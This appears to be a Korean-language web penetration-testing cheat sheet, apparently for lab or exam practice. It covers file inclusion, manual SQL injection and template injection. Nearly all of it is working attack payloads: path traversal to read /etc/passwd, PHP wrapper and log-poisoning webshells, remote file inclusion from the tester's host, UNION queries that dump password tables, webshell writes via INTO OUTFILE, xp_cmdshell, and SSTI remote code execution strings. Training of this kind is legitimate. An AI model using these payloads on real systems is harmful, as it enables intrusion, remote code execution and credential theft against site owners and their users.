## 1. LFI / RFI (파일 인클루전: ?file= ?page= ?include= ?path=)

```bash
#소스 읽기 (실행 안 되고 base64로) ← 1순위
?file=php://filter/convert.base64-encode/resource=index.php   → base64 -d
#시스템 파일 (경로 traversal)
?file=../../../../etc/passwd        (Windows: ..\..\..\windows\win.ini)
#RCE 래퍼
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
?file=php://input        (POST 본문에 <?php system($_GET['c']);?>)
?file=expect://id
#로그 포이즈닝: UA/User-Agent에 <?php system($_GET['c']);?> 주입 후
?file=/var/log/apache2/access.log&c=id
#필터체인 RCE (base64로 소스만 읽히고 RCE 안 될 때)
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
#RFI (allow_url_include=On)
?file=http://tun0IP/shell.txt
```

### 0. LFI가 아예 되는지 먼저

```
?file=/etc/passwd          → root:x:0:0... 보이면 LFI 됨
?file=../../../../etc/passwd
```

**에러 메시지를 읽으세요.** `failed to open stream: /etc/passwd.php` 라고 나오면 → **앱이 `.php`를 자동으로 붙이는** 겁니다(그럼 일반 파일 직접 읽기 막힘, filter/traversal 조정 필요).

### 1. php://filter (읽기) 되는지

```
?file=php://filter/convert.base64-encode/resource=index
→ PD9waHAK... 같은 base64가 나오면 → filter 됨 (거의 항상 됨)
```

### 2. allow_url_include 켜졌나 (data://, php://input, RFI의 조건) ← 제일 중요한 체크

**RCE 마커로 테스트** — 실행되면 마커가 보임:

```
#data:// 테스트
?file=data://text/plain,<?php echo 'PWN12345';?>
→ 페이지에 PWN12345 보이면 → allow_url_include=On (data://, php://input RCE 가능)
→ 안 보이거나 "URL file-access is disabled" 에러 → Off

#php://input 테스트 (POST)
curl "http://T/index.php?file=php://input" --data "<?php echo 'PWN12345';?>"

#RFI 테스트 (내 서버로 가져오나)
?file=http://tun0IP/test.txt      # Kali에서 python3 -m http.server, 로그에 요청 뜨면 On
```

### 3. expect:// (직접 명령 실행) 되나

```
?file=expect://id      → uid=... 보이면 expect 확장 로드됨 (드묾)
```

### 4. 로그 포이즈닝 가능한가

```
#먼저 로그를 "읽을 수 있나" 확인
?file=/var/log/apache2/access.log    → 로그 내용 보이면 → 포이즈닝 viable
→ Permission denied면 다른 경로(/var/log/nginx/, auth.log) 시도
```

### 5. 필터체인 RCE (allow_url_include Off여도 됨)

```
#php://filter가 되면(1번 통과) 항상 시도 가능
python3 php_filter_chain_generator.py --chain "<?php echo 'PWN12345';?>"
→ 나온 체인을 ?file=에 넣어 PWN12345 실행되면 됨
```

### 6. ★설정을 직접 보기 (제일 확실)

LFI로 **php 설정 파일이나 phpinfo를 읽으면** 됨/안됨을 추측 안 하고 확인:

```
?file=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
→ 디코딩해서 allow_url_include, allow_url_fopen, expect 확장 값 직접 확인
#phpinfo 페이지가 있으면 거기서 바로 확인
```

### 정리 — 체크 순서

```
① ?file=/etc/passwd     → LFI 되나 + .php 붙나 (에러 읽기)
② filter base64         → 소스 읽기 되나
③ data:// 마커          → allow_url_include On? (data/input RCE 가능?)
④ expect://id           → expect 되나
⑤ 로그 읽기             → 포이즈닝 가능?
⑥ 필터체인              → (위 다 막혀도) RCE
```

**두 가지 습관 (당신 약점 직결):**

1. **RCE 테스트는 항상 마커(PWN12345)로** — "실행됐나 vs 글자로 나왔나"를 확실히 구분.
2. **에러 메시지를 읽어라** — `URL file-access is disabled`(allow_url_include Off), `failed to open .../x.php`(확장자 append) 처럼 **에러가 설정을 알려줍니다.** 추측하지 말고 에러/마커로 확인.

## 3. SQL Injection (수동 — sqlmap 금지)

```sql
-- 탐지
'   "   '-- -   ' OR '1'='1
-- 인증 우회
admin'-- -        ' OR 1=1-- -
-- 컬럼 수 (ORDER BY 늘려가며 에러) → UNION
' ORDER BY 5-- -
' UNION SELECT 1,2,3,4,5-- -
-- 정보 수집 (MySQL)
' UNION SELECT version(),database(),user(),4,5-- -
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -
-- 파일 읽기 / 웹셸 쓰기 (권한·secure_file_priv 필요)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5-- -
' UNION SELECT 1,"<?php system($_GET['c']);?>",3,4,5 INTO OUTFILE '/var/www/html/s.php'-- -
-- Blind (boolean / time)
' AND 1=1-- -   vs   ' AND 1=2-- -
' AND SLEEP(5)-- -
-- MSSQL RCE
'; EXEC xp_cmdshell 'whoami'-- -
```


```
  {{config}}   {{cycler.__init__.__globals__.os.popen('id').read()}}
  {{''.__class__.__mro__[1].__subclasses__()}}   (subprocess 찾아 RCE)

  {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

## 순회 원칙 (당신 약점 직결)

> 파라미터/입력을 보면 **하나 해보고 멈추지 말고** 위 목록을 순회한다.
> 
> - `?file=`/`?page=` → **LFI 무기 전체**(소스→traversal→래퍼→로그→필터체인)
> - 업로드 → **우회 6종**
> - 입력이 쿼리로 → **SQLi**(수동), 명령으로 → **cmd injection**, 페이지 반영 → **SSTI**
> - 로그인 → 기본자격증명 → SQLi우회 → JWT
> - 버전 보이면 → **searchsploit** 먼저

**핵심:** LFI로 소스 읽으면 → 거기서 다음 파일/크리덴셜/엔드포인트 발견 → 계속 파고든다. "안 되네"가 아니라 "다음 무기".
